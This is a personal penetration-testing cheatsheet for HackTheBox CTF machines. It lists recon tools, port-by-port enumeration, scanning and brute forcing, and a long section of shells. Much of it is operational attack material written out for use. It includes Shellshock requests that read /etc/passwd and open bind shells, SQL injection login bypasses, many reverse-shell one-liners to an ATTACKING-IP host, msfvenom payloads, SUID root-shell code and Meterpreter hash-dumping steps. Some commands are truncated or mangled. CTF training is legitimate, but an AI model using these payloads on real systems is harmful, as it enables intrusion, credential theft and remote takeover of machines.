## Purpose

Cheatsheet for [HackTheBox](https://www.hackthebox.eu/) with common things to do while solving these CTF challenges.

Because a smart man once said:
> Never google twice.



## Linux General

`ctrl + r`

Search History reverse

## Run Script at startup

```
chmod 755 /path/to/the/script
update-rc.d /path/to/the/script defaults
```

`update-rc.d -f  /path/to/the/script remove`

Delete Script from defaults

# Reconnaissance(Information Gathering) start

- [hunter.io](https://hunter.io/) - known email and users for a specific domain


- theharvester - search for emails in several search engines

    ```bash
    theHarvester -d *.co.il -l 500 -b google
    ```

- sublist3r - search for subdomain for a given domain
- [crt.sh](http://crt.sh) - subdomains  search with %.tesla.co.il
- [httprobe](https://github.com/tomnomnom/httprobe) - will check a list of domain if they are alive, we can fire it sublis3r results
- [amass](https://github.com/OWASP/Amass) - can also search for subdomains and more

    ```bash
    amass enum -d tesla.com
    ```

- [builtwith](https://builtwith.com/) - show frameworks and technologies any domain is built with, then we can search for exploits for those technologies
- [wappalizer](https://www.wappalyzer.com/download/) - browser addon that does almost the same as builtwith
- whatweb - same but uglier than builtwith
- [sumrecon](https://github.com/Gr1mmie/sumrecon) - script that automate some of the above
- [shodan.io](http://shodan.io) - find open ports and services online
- [censys.io](https://search.censys.io/) - discove your internet assets by using ip or hosts.
- [zoomeye.org](https://www.zoomeye.org/) - Zoomeye is the another search engine which is used mostly to see open devices that are vulnerable and most often used by pentesters to test or exploit there vulnerabilities over the internet.
- [netcraft.com](https://sitereport.netcraft.com/) - Netcraft's internet data mining, find out the technologies and infrastructure used by any site.
- [dnsdumpster](https://dnsdumpster.com/) - dns recon & research, find & lookup dns records
- [ipinfo.io](http://ipinfo.io) - ip info
- [osint framework](https://osintframework.com/) - OSINT framework focused on gathering information from free tools or resources.
- [dehashed](https://www.dehashed.com) - find leaked emails and passwords
- simplyemail - enumerate all the online places (github, target site etc)

    ```
    git clone https://github.com/killswitch-GUI/SimplyEmail.git
    ./SimplyEmail.py -all -e TARGET-DOMAIN
    ```

- DNSRecon - DNS Bruteforce

    ```bash
    dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
    ```

- Skipfish - prepares an interactive sitemap for the targeted site

    ```bash
    # basic scan
    skipfish -o out_dir https://www.host.com
    # using cookies to access authenticated pages
    skipfish -o out_dir -I urls_to_scan -X urls_not_to_scan -C cookie1=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX -C cookie2=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://www.host.com
    ```

- [namechk](https://namechk.com/) / [whatsmyname](https://whatsmyname.app/) / [namecheckup](https://namecheckup.com/) - OSINT use accounts around the web
- [maltego](https://sectools.org/tool/maltego/) - data mining application

- Exploiting Shellshock

    ```bash
    git clone https://github.com/nccgroup/shocker
    ```

    ```bash
    ./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
    ```

    cat file (view file contents)

    ```bash
    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
    ```

    Shell Shock run bind shell

    ```bash
    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
    ```

    Shell Shock reverse Shell

    ```bash
    nc -l -p 443
    ```


# Reconnaissance(Information Gathering) done


# Enumeration Open Ports start

[Pentesting Network](https://book.hacktricks.xyz/pentesting/pentesting-network)

## FTP Enumeration (21)

```bash
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
FTP anonymous sign in
	mget * #download everything

#can we upload file as anonymous?
#if so we can try upload a cmd webshell and execute commands
locate cmd.aspx #if iis
put cmd.aspx
#browse to the file:
http://IP/cmd.aspx

#we can also try to create a shell payload with msfvenum and upload it
```

## **SSH (22):**

```bash
ssh INSERTIPADDRESS 22

nc IP 22

nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s

#downloading
scp username@hostname:/path/to/remote/file /path/to/local/file
```

If NMAP show "SSH Filtered" it means that [port knocking](https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/) is enable

```bash
#we need to find the /etc/knockd.conf (thorough LFI or FTP or something else)
#inside there is a sequence
knock IP SEQUENCE1 SEQUENCE2 SEQUENCE3
#check nmap again
```

## **SMTP Enumeration (25):**

```bash
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1
```

```bash
nc -nvv INSERTIPADDRESS 25
```

```bash
telnet INSERTIPADDRESS 25
```

```jsx
use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(smtp_enum) > set rhosts 192.168.1.107
msf auxiliary(smtp_enum) > set rport 25
msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt
msf auxiliary(smtp_enum) > exploitw
```

## DNS (53)

```bash
#DNS zone transfer
sudo nano /etc/hosts
10.10.10.123  friendzone.red 
host -l friendzone.red 10.10.10.123
```

## **Finger Enumeration (79):**

Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

```bash
finger-user-enum.pl [options] (-u username|-U users.txt) (-t host|-T ips.txt)(
```

## **Web Enumeration (80/443):**

[extra enumeration from hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)

if we get default apache page, try entering IP to HOSTS

Before dirbusting, try going to index.php or index.html to know which extention to look for 

```bash
dirbuster (GUI)
#1st try without "be recursive"
```

```powershell
cd ~/tools
./feroxbuster -u URL -w WORDLIST -x EXT -C 403 -t 100
```

```bash
Web Extensions

sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
```

```bash
dirb http://target.com /path/to/wordlist
dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old
```

```bash
gobuster dir -u https://target.com -b 403 ms-w /usr/share/wordlists/dirb/big.txt -x .txt,.php
use -r (recursive) or try found folders
```

```bash
nikto –h 10.0.0.1 #web vulnerability scanner
```

```jsx
owasp zap
```

```bash
Look for Default Credentials
```

```bash
sql
```

- View Page Source

    ```bash
    Hidden Values
        Developer Remarks
        Extraneous Code
        Passwords!
    ```

- burpsuite

    ```bash
    compare “host:”
    crsf token = no bruteforce
    add php code if url has anything.php
            <L>
     anything being executed?
            try directory traversal
                ../../../home
    ```

- sign in page

    ```bash
    SQL Injection

        ‘or 1=1– –
        ‘ or ‘1’=1
        ‘ or ‘1’=1 — –
        ‘–
        Use known Username
            tyler’ — –
            tyler’) — –

    #bruteforce
    hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>
    ```

- file upload

    ```bash

    #if NMAP show something like: Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND
    #we want to check if we can upload files
    davtest -url http://IP
    #if we see succedd we can use curl to upload:
    curl -X PUT http://10.10.10.15/df.txt -d @test.txt
    #and execute it:
    **curl http://10.10.10.15/df.txt**

    Blacklisting bypass
            bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6 
        Whitelisting bypass
            passed by uploading a file with some type of tricks, Like adding a null byte injection like ( shell.php%00.gif ). Or by using double extensions for the uploaded file like ( shell.jpg.php)
    ```

- Wfuzz - Subdomain brute forcer, replaces a part of the url like username with wordlist

    ```bash
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

    wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ

    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
    ```

- [Knockpy](https://github.com/guelfoweb/knock) - enumerate subdomains on a target domain through a wordlist

    ```bash
    knockpy domain.com
    ```

- wpscan - if wordpress found

    ```bash
    wpscan --url [http://:80$target](http://:80$target) --enumerate u,t,p | tee $target-wpscan-enum
    #if we can enter wordpres, we can change the 404 page to php reverse shell code and gain access
    ```

- joomscan - if joomla found

    ```powershell

    cd ~/tools/joomscan
    perl joomscan.pl -u http://10.10.10.150/administrator/
    ```

## If A File is found

- steghide - check pictures for hidden files

    ```bash
        apt-get install steghide

        steghide extract -sf picture.jpg

        steghide info picture.jpg

        apt-get install stegosuite
    ```

- [Stegseek](https://github.com/RickdeJager/stegseek) - lightning fast steghide cracker to extract hidden data from files

    ```bash
    stegseek [stegofile.jpg] [wordlist.txt]
    ```

- binwalk - extract hidden files from files (steganography)

    ```bash
    binwalk FILE.JPG
    #if something was found 
    binwalk -e FILE
    ```

- strings - check strings in files

    ```bash
    stringe FILE.jpg
    ```

- [exiftool](https://github.com/exiftool/exiftool) - pictures metadata
- zip2john - prepare an encrpyted zip file for john hacking

    ```bash
    zip2john ZIPFILE > zip.hashs
    ```

- SQLite DB

    ```powershell
    #if we found a flat-file db 
    file EXAMPLE.db
    #if sqlite3
    sqlite3 <database-name>
    .tables
    PRAGMA table_info(customers);
    SELECT * FROM customers;
    ```

- sqlmap - check website for sql injection (more info down)

    [Sqlmap trick](https://hackertarget.com/sqlmap-post-request-injection/) - if we have a login page, we can try admin:admin, catch that in burpsuite,  save the full request to a file, run:

    ```bash
    sqlmap -r FILENAME --level=5 --risk=3 --batch
    sqlmap -r FILENAME -dbs --level=5 --risk=3 --batch

    sqlmap -r FILENAME --dbs #enumarate DB's
    sqlmap -r FILENAME -D DB_Name --tables #enumarate tables
    sqlmap -r FILENAME -D DB_Name -T TABLE_Name --dump #DUMP table

    #Find SQL in webpage url automatically
    sqlmap -u https://IP/ –crawl=1

    #with authentication
    sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

    #Get A Reverse Shell (MySQL)
    sqlmap -r post_request.txt --dbms "mysql" --os-shell
    ```

- [fimap](https://github.com/kurobeats/fimap) - Check for LFI, find, prepare, audit, exploit and even google automatically for local and remote file inclusion

    ```bash
    ~/tools/fimap/src/fimap.py –H –u http://target-site.com/ -w output.txt
    ```

    If we see in burpsuite php$url= we need to test for LFI (try /etc/passwrd)

    ```bash
    http://$ip/index.php?page=/etc/passwd
    http://$ip/index.php?file=../../../../etc/passwd
    ```

## if a page redirects to another, we can use burp to stop

```bash
Proxy -> Options -> Match and Replace
```

![step 1](https://github.com/geeksniper/My-ctf-tools-cheetsheet/blob/2292985ede3372879031a5020763ca43b9ff09c6/img/redirect1.png)
![step 2](https://github.com/geeksniper/My-ctf-tools-cheetsheet/blob/937aa4927b87c43d692f431ae36b512a71a67590/img/redirect2.png)

## kerberos (88):

```powershell
tel#add host to /etc/hosts
sudo gedit /etc/hosts

./GetUserSPNs.py -request active.htb/SVC_TGS > admin.txt
#the password we will get will be encrypted
john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt

#with the cracked password...
psexec.py administrator@active.htb
```

## **Pop3 (110):**

```bash
telnet INSERTIPADDRESS 110
```

```bash
USER [username]
```

```bash
PASS [password]
```

- To login

```bash
LIST
```

- To list messages

```bash
RETR [message number]
```

- Retrieve message

```bash
QUIT
```

```bash
quits
```

## RPC (135)

```bash
rpcclient --user="" --command=enumprivs -N $ip #Connect to an RPC share without a username and password and enumerate privledges
rpcclient --user="<Username>" --command=enumprivs $ip #Connect to an RPC share with a username and enumerate privledges
```

## **RPCBind (111):**

```bash
rpcinfo –p x.x.x.x
```

## **SMB\RPC Enumeration (139/445):**

```bash
smbmap -H 10.10.10.149
```

```bash
smbclient -L \\\\10.0.0.100\\
smbclient \\\\10.0.0.100\\Replication
prompt off #doesnt prompt of us downloading
recurse on` #download all the files
mget *` #download all files in this share

```

```bash
enum4linux -a 10.0.0.1 #Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
```

```bash
nbtscan x.x.x.x #Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
```

```bash
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
```

```bash
python /home/hasamba/tools/impacket/build/scripts-3.8/samrdump.py 192.168.XXX.XXX
```

```bash
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP
```

smb4k on Kali, useful Linux GUI for browsing SMB shares

```bash
apt-get install smb4k -y
```

- on Windows:
- Download All Files From A Directory Recursively

```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

```bash
net use \\TARGET\IPC$ "" /u:"" #Manual Null session testing
```

## **SNMP Enumeration (161):**

- Fix SNMP output values so they are human readable:

```bash
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

```bash
snmpwalk -c public -v1 192.168.1.X 1| 
 grep hrSWRunName|cut -d* * -f
```

```bash
snmpcheck -t 192.168.1.X -c public
```

```bash
onesixtyone -c names -i hosts
```

```bash
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
```

```bash
snmpenum -t 192.168.1.X
```

```bash
onesixtyone -c names -i hosts
```

```bash
#metasploit
    auxiliary/scanner/snmp/snmp_enum
    auxiliary/scanner/snmp/snmp_enum_hp_laserjet
    auxiliary/scanner/snmp/snmp_enumshares
    auxiliary/scanner/snmp/snmp_enumusers
    auxiliary/scanner/snmp/snmp_login
```

## **Oracle (1521):**

```bash
tnscmd10g version -h INSERTIPADDRESS
```

```bash
tnscmd10g status -h INSERTIPADDRESS
```

## LDAP (389)

[JXplorer - an open source LDAP browser](http://jxplorer.org/)

## MSSQL (1433)

```bash
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt IP
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP
```

[Hunting for MSSQL | Offensive Security](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)

## **Mysql Enumeration (3306):**

```bash
nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

mysql –h IP -u root -p
show databases;
show tables;
use tablename;
describe table;
select table1, table2 from tablename;
```

## Active Directory

```bash
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```

# Enumeration Open Ports done


# Scanning start

- arp-scan (Kali) - gives all IP's on NAT
- netdiscover (Kali) - show live IP's

    ```bash
    sudo netdiscover -r 10.0.0.0/24
    ```

- [rustscan](https://github.com/RustScan/RustScan#-usage) - Scans all 65k ports in 3 seconds and pipe them to NMAP

    ```bash
    rustscan -a 127.0.0.1 -- -A -sC 
    #it's like running nmap -Pn -vvv -p $PORTS -A -sC 127.0.0.1
    ```
- nmap
    
    basic scan   
    `nmap -sV -sC -p- -oN [FILE] [IP]`

    Standard scan

    `nmap -p- -sV -sC -A  --min-rate 1000 --max-retries 5 -oN [FILE] [IP]`

    Faster But ports could be overseen because of retransmissoin cap

    `nmap --script vuln -oN [FILE] [IP]`


- masscan (kali): another fast port scanner

    ```bash
    masscan -p1-65535 --rate 1000 10.0.0.101
    ```

- metasloit - auxiliary in msf is extra enumration and recon

    ```bash
    use auxiliary/scanner/smb/smb_version
    ```

- searchsploit (kali) - search exploit-db website offline

    ```bash
    searchsploit mod ssl 2
    ```

- [Nessus](https://www.tenable.com/products/nessus) - vulnerability assessment, it can scan for open ports, open vulnerabilities, directory busting
- openvas - Vulnerability Assessment

    ```bash
    apt-get update
    apt-get dist-upgrade -y
    apt-get install openvas
    openvas-setup
    netstat -tulpn #Verify openvas is running using
    #Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup


## AIO Scanners

- [nmap automator](https://github.com/21y4d/nmapAutomator) - A script that you can run in the background!

    ```bash
    ./nmapAutomator.sh <TARGET-IP> <TYPE>  
    ./nmapAutomator.sh 10.1.1.1 All  
    ./nmapAutomator.sh 10.1.1.1 Basic  
    ./nmapAutomator.sh 10.1.1.1 Recon
    ```

- [autorecon](https://github.com/Tib3rius/AutoRecon) - multi-threaded network reconnaissance tool which performs automated enumeration of services

    ```bash
    autorecon 127.0.0.1

    ```

- [Vanquish](https://github.com/frizb/Vanquish) - AIO tool (NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident-user-enum | Smtp-user-enum | Snmp-check | Cisco-torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan-unixwiz | Xprobe2 | Blindelephant | Showmount)

    ```bash
    echo "[IP]" > ~/tools/vanquish/hosts.txt
    python2 Vanquish2.py -hostFile hosts.txt -logging -outputFolder ~/hackthebox/[BOXNAME]

    ```

- [hackerEnv](https://github.com/abdulr7mann/hackerEnv) - automation tool that quickly and easily sweep IPs and scan ports, vulnerabilities and exploit them

    ```bash
    ./hackerEnv -t 10.10.10.10
    ```

- [fsociety](https://github.com/Manisso/fsociety) - A Penetration Testing Framework, you will have every script that a hacker needs

- recon-ag - full-featured web reconnaissance framework written in Python

    ```bash
    git clone https://github.com/lanmaster53/recon-ng.gitcd /recon-ng
    ./recon-ng
    show modules
    help
    ```

- [autorecon](https://github.com/Tib3rius/AutoRecon) - multi-threaded network reconnaissance tool which performs automated enumeration of services

    ```bash
    autorecon 127.0.0.1
    ```

- [legion](https://github.com/carlospolop/legion) - Automatic Enumeration Tool

    ```jsx
    sudo ~/tools/legion/legion.py
    options
    set host 10.0.0.210
    run
    ```
    
# Scanning done

# Gaining Access start

- hydra: bruteforce tool

    ```bash
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.101 -t 4 -v -f
    #-l is the user we want to attack, -P password file list, -t threads, -v verbose
    #it's better to intercept the login page with burp, check to see the correct username&password syntax and copy the exact failed message
    -#f   exit when a login/pass pair is found
    hydra -l hasamba -P ~/Desktop/test_passwords.txt 10.0.0.210 -s 8085 http-post-form "/login/:username=^USER^&password=^PASS^:F=Authentication failed" -VVV -t 6 -
    hydra OPT #will show us optional moduls for http and such
    hydra -U MODULE_NAME #will show module examples

    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V #Hydra FTP brute force
    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V #Hydra POP3 brute force
    hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V #Hydra SMTP brute force

    hydra -l username -P password-list <URL_TO_SERVER> http-post-form "<PATH-TO_LOGIN>:POST_REQUEST_FOR_LOGIN:FAILED_RESPONSE_IDENTIFIER"
    ```

- metasploit - can also bruteforce

    ```bash
    use auxialary/scanner/ssh/ssh_login
    options
    set username root
    set pass_file /usr/share...
    set rhosts
    set threads 10
    set verbose true
    run
    ```

- unshadow (kali) - combine both files and will insert the hashed passwords to the passwd file, so we can use this file with hashcat to maybe decrypt the password.

    ```bash
    unshadow PASSSWD_FILE SHADOW_FILE
    ```

- [hashcat](https://www.notion.so/Hashcat-b885f8ac8c0f450986d62c0d29f44cb9) - crack passwords hashes ([Cheat Sheet](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a44ab748-a9a9-437e-a4a1-2fa1cc6c03a8/HashcatCheatSheet.v2018.1b.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20201122%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20201122T190235Z&X-Amz-Expires=86400&X-Amz-Signature=03753b73d70b97901e6a764011ae5ffdbffc2d9dcbd00673f79b64097b1299d9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22HashcatCheatSheet.v2018.1b.pdf%22))

    ```bash
    hashcat -m "OSCODE" unshadow.txt passwordFile.txt
    #from here: https://github.com/frizb/Hashcat-Cheatsheet
    hashcat --force -m300 --status -w3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt
    ```

- hash-identifier

    ```bash
    hash-identifier [hash]
    ```

- [name-that-hash](https://github.com/HashPals/Name-That-Hash) - better hash analyzer

    ```jsx

    ```

- cewl - create wordlist from a website

    ```bash
    cewl  -v --with-numbers -e --email_file cewl_email.wordlist -w cewl.wordlist http://sneakycorp.htbme

    #my favorite rule to add:
    john --wordlist=wordlist.txt --rules=jumbo --stdout > wordlist-modified.txt

    hashcat --force cewl.wordlist -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words

    https://github.com/praetorian-inc/Hob0Rules
    ###hob064 This ruleset contains 64 of the most frequent password patterns
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/rockyou.txt -r hob064.rule -o cracked.txt

    ###d3adhob0 This ruleset is much more extensive and utilizes many common password structure ideas
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/english.txt -r d3adhob0.rule -o cracked.txt

    #adding John rules
    john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
    john --wordlist=wordlist.txt --rules=best64 --stdout > wordlist-modified.txt
    ```

- john the ripper - password cracker ([cheat sheet](https://drive.google.com/viewerng/viewer?url=https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf)) ([Jumbo community version](https://github.com/openwall/john))

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    #after john finished, ask him to show
    john hashes.txt --show

    john 127.0.0.1.pwdump --wordlist=dictionary.txt --rules=Jumbo #with jumbo rules from https://github.com/openwall/john
    ```

    [CyberChef](https://gchq.github.io/CyberChef/)

    [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)

    [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)

    [Cipher Identifier (online tool) | Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)

- msfvenom(kali) - tool to create malware

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=10.10.10.14 LPORT=4444 -f aspx > ex.aspx

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
    ```

- [responder (imapcket)](https://www.notion.so/responder-imapcket-b7bdbbb91ce74e98834dd88ec1715528) - MITM - listening in the background and wait for a failed dns request

    ```bash
    responder -I eth0 -rdwv #Run Responder.py for the length of the engagement while you're working on other attack vectors.


# Gaining access done

# **Shells & Reverse Shells**

## **SUID C Shells**

- bin/bash:

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

- bin/sh:

```
int main(void){

setresuid(0, 0, 0);

system("/bin/sh");

}
```

### **TTY Shell:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")' #Python TTY Shell Trick
```

```bash
echo os.system('/bin/bash')
```

```bash
/bin/sh –i #Spawn Interactive sh shell
```

```bash
execute('/bin/sh')
```

- LUA

```bash
!sh
```

- Privilege Escalation via nmap

```bash
:!bash
```

- Privilege escalation via vi

### Fully Interactive TTY

```
                                In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
                                In Attacker console
stty -a
stty raw -echo
fg
                                In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### **Spawn Ruby Shell**

```bash
exec "/bin/sh"
```

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
```

### **Netcat**

```bash
nc -e /bin/sh ATTACKING-IP 80
```

```bash
/bin/sh | nc ATTACKING-IP 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

### **Telnet Reverse Shell**

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

### **PHP**

```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)

### **Bash**

```bash
exec /bin/bash 0&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash
# or: while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

### **Perl**

```bash
exec "/bin/sh";
```

```bash
perl —e 'exec "/bin/sh";'
```

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

- Windows

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- 

# Meterpreter (Metasploit) ([cheet sheet](https://www.tunnelsup.com/metasploit-cheat-sheet/))

### **Windows reverse meterpreter payload**

```bash
set payload windows/meterpreter/reverse_tcp
```

- Windows reverse tcp payload

### **Windows VNC Meterpreter payload**

```bash
set payload windows/vncinject/reverse_tcpf
```

- Meterpreter Windows VNC Payload

```bash
set ViewOnly false
```

### **Linux Reverse Meterpreter payload**

```bash
set payload linux/meterpreter/reverse_tcp
```

- Meterpreter Linux Reverse Payload

### **Meterpreter Cheat Sheet**

```bash
upload file c:\\windows
```

- Meterpreter upload file to Windows target

```bash
download c:\\windows\\repair\\sam /tmp
```

- Meterpreter download file from Windows target

```bash
download c:\\windows\\repair\\sam /tmp
```

- Meterpreter download file from Windows target

```bash
execute -f c:\\windows\temp\exploit.exe
```

- Meterpreter run .exe on target – handy for executing uploaded exploits

```bash
execute -f cmd -c
```

- Creates new channel with cmd shell

```bash
ps
```

- Meterpreter show processes

```bash
shell
```

- Meterpreter get shell on the target

```bash
getsystem
```

- Meterpreter attempts priviledge escalation the target

```bash
hashdump
```

- Meterpreter attempts to dump the hashes on the target (must have privileges; try migrating to winlogon.exe if possible first)

```bash
portfwd add –l 3389 –p 3389 –r target
```

- Meterpreter create port forward to target machine

```bash
portfwd delete –l 3389 –p 3389 –r target
```

- Meterpreter delete port forward

```bash
use exploit/windows/local/bypassuac
```

- Bypass UAC on Windows 7 + Set target + arch, x86/64

```bash
use auxiliary/scanner/http/dir_scanner
```

- Metasploit HTTP directory scanner

```bash
use auxiliary/scanner/http/jboss_vulnscan
```

- Metasploit JBOSS vulnerability scanner

```bash
use auxiliary/scanner/mssql/mssql_login
```

- Metasploit MSSQL Credential Scanner

```bash
use auxiliary/scanner/mysql/mysql_version
```

- Metasploit MSSQL Version Scanner

```bash
